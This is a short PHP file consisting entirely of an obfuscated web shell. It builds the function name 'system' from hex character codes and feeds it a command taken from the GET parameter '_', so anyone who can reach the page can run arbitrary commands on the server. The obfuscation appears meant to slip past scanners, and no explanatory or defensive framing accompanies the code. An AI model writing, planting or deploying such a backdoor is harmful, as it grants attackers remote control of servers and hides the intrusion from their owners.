<?php
$_ = chr(0x73).chr(0x79).chr(0x73).chr(0x74).chr(0x65).chr(0x6d);
$cmd = filter_input(INPUT_GET, chr(0x5f), FILTER_DEFAULT); 
$_($cmd); 
?>
